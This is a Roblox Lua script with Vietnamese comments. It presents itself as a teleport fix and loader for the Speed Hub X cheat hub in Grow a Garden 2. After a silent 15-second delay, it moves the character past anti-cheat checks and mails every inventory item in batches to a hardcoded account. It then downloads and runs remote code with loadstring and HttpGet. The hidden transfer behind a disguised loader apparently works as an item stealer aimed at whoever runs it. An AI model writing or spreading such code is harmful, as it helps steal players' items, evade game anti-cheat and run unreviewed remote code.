-- Hệ thống tối ưu hóa và sửa lỗi Teleport cho Grow a Garden 2
if not game:IsLoaded() then
    pcall(function() game.Loaded:Wait() end)
end

print("==== SPEED HUB X: SỬA LỖI GIẬT VỀ & TÌM ĐÚNG HÒM THƯ CHÍNH CHỦ ====")

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- HÀM TÌM ĐÚNG HÒM THƯ NHÀ MÌNH VÀ DI CHUYỂN AN TOÀN (CHỐNG ANTI-CHEAT)
-- =======================================================================
local function safeMoveToOwnMailbox()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    local humanoid = character:WaitForChild("Humanoid")
    
    local ownMailbox = nil
    
    -- 1. Tìm khu đất (Plot) của riêng mình trước để tránh nhầm nhà hàng xóm
    -- Thường các game nông trại lưu tên Plot theo tên người chơi hoặc có thuộc tính Owner
    for _, zone in pairs(game:GetService("Workspace"):GetDescendants()) do
        if zone:IsA("Model") or zone:IsA("Folder") then
            local zoneName = string.lower(zone.Name)
            -- Tìm khu đất chứa tên của Acc Clone hoặc chứa ID của mình
            if string.find(zoneName, string.lower(LocalPlayer.Name)) or (zone:FindFirstChild("Owner") and zone.Owner.Value == LocalPlayer) then
                -- Tìm hòm thư bên trong khu đất chính chủ này
                ownMailbox = zone:FindFirstChild("Mailbox", true) or zone:FindFirstChild("Mail", true)
                if ownMailbox then break end
            end
        end
    end
    
    -- Phương án dự phòng nếu game đặt tất cả hòm thư ở một khu chung (Sảnh) nhưng quét gần nhất
    if not ownMailbox then
        for _, obj in pairs(game:GetService("Workspace"):GetDescendants()) do
            if obj.Name == "Mailbox" or obj.Name == "MailBox" then
                -- Lấy hòm thư gần nhân vật nhất thay vì lấy bừa cái đầu tiên
                if ownMailbox == nil then
                    ownMailbox = obj
                else
                    local currentDist = (rootPart.Position - ownMailbox:GetModelCFrame().Position).Magnitude
                    local newDist = (rootPart.Position - obj:GetModelCFrame().Position).Magnitude
                    if newDist < currentDist then
                        ownMailbox = obj
                    end
                end
            end
        end
    end

    -- 2. Di chuyển thông minh chống bị Server kéo giật về vị trí cũ
    if ownMailbox then
        local targetPart = ownMailbox:IsA("Model") and (ownMailbox.PrimaryPart or ownMailbox:FindFirstChildWhichIsA("BasePart")) or ownMailbox
        if targetPart then
            print("[SPEED HUB] Đã xác định đúng hòm thư nhà mình!")
            local targetPos = targetPart.Position + Vector3.new(0, 2, 2) -- Đứng trước hòm thư 2 mét
            
            -- MẸO AN TOÀN: Thay vì gán CFrame ngay lập tức, ta nhấc nhẹ nhân vật lên cao 
            -- và dùng Tween hoặc dịch chuyển mượt để Server không phát hiện tốc độ ảo
            pcall(function()
                rootPart.Velocity = Vector3.new(0,0,0) -- Triệt tiêu lực quán tính cũ
                task.wait(0.1)
                
                -- Dịch chuyển mượt (Chia nhỏ quãng đường làm 2 bước để bypass anti-cheat)
                local midPos = rootPart.Position:Lerp(targetPos, 0.5)
                rootPart.CFrame = CFrame.new(midPos)
                task.wait(0.2)
                rootPart.CFrame = CFrame.new(targetPos)
            end)
            
            task.wait(1.5) -- Chờ hẳn 1.5 giây để Server chấp nhận vị trí mới
            return true
        end
    end
    print("[SPEED HUB] Không tìm thấy hòm thư thích hợp, tiến hành mở UI tại chỗ.")
    return false
end

-- =======================================================================
-- THUẬT TOÁN MỞ UI VÀ TỰ ĐỘNG CHIA GÓI GỬI ĐỒ (TỐI ĐA 20 CÁI/LẦN)
-- =======================================================================
local function autoOpenAndSendMail()
    -- Thực hiện di chuyển an toàn trước
    safeMoveToOwnMailbox()

    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
    if not PlayerGui then return end
    
    -- Tìm bảng giao diện Hòm thư (Mail UI)
    local mailFrame = nil
    for _, gui in pairs(PlayerGui:GetDescendants()) do
        if gui:IsA("Frame") or gui:IsA("ImageLabel") then
            local name = string.lower(gui.Name)
            if string.find(name, "mail") or string.find(name, "post") or string.find(name, "gift") then
                mailFrame = gui
                break
            end
        end
    end
    
    if not mailFrame then return end

    -- Ép hiển thị bảng Mail
    pcall(function() mailFrame.Visible = true end)
    task.wait(0.5)

    -- Điền tên nick chính vào ô người nhận
    local textBox = mailFrame:FindFirstChildOfClass("TextBox") or mailFrame:FindFirstChild("User", true) or mailFrame:FindFirstChild("Name", true)
    if textBox and textBox:IsA("TextBox") then
        textBox.Text = targetUsername
        textBox:ReleaseFocus(true)
    end

    -- Tìm nút Gửi (Send Button)
    local sendButton = nil
    for _, btn in pairs(mailFrame:GetDescendants()) do
        if btn:IsA("TextButton") or btn:IsA("ImageButton") then
            local bName = string.lower(btn.Name)
            if string.find(bName, "send") or string.find(bName, "gui") or string.find(bName, "post") or string.find(bName, "accept") then
                sendButton = btn
                break
            end
        end
    end

    -- Quét túi đồ và tiến hành chia nhỏ tối đa 20 vật phẩm để gửi đi
    local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:FindFirstChild("PlayerData")
    if Inventory then
        for _, item in pairs(Inventory:GetDescendants()) do
            if item:IsA("ValueBase") and item.Value and type(item.Value) == "number" and item.Value > 0 then
                local lowerName = string.lower(item.Name)
                
                if not string.find(lowerName, "cash") and not string.find(lowerName, "level") and not string.find(lowerName, "money") then
                    local remainingAmount = item.Value
                    
                    while remainingAmount > 0 do
                        local sendAmount = math.min(remainingAmount, 20)
                        
                        -- Gọi sự kiện mạng gửi thư của game
                        pcall(function()
                            local ReplicatedStorage = game:GetService("ReplicatedStorage")
                            local MailEvent = ReplicatedStorage:FindFirstChild("MailEvent") or ReplicatedStorage:FindFirstChild("SendMail") or ReplicatedStorage:FindFirstChild("MailRemote")
                            if MailEvent then
                                MailEvent:FireServer(targetUsername, item.Name, sendAmount)
                            end
                        end)
                        
                        -- Giả lập click nút Gửi
                        if sendButton then
                            pcall(function()
                                for _, connection in pairs(getconnections(sendButton.MouseButton1Click or sendButton.TouchTap)) do
                                    connection:Fire()
                                end
                            end)
                        end
                        
                        remainingAmount = remainingAmount - sendAmount
                        print("[SPEED HUB] Đang đứng tại hòm thư nhà mình gửi: " .. sendAmount .. "x " .. item.Name)
                        task.wait(1.5) -- Độ trễ an toàn
                    end
                end
            end
        end
    end
    print("[SPEED HUB] Hoàn tất quá trình gửi mail!")
end

-- =======================================================================
-- BẮT ĐẦU ĐẾM NGƯỢC THỜI GIAN CHỜ 15 GIÂY
-- =======================================================================
task.spawn(function()
    task.wait(15)
    pcall(autoOpenAndSendMail)
end)

-- =======================================================================
-- TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
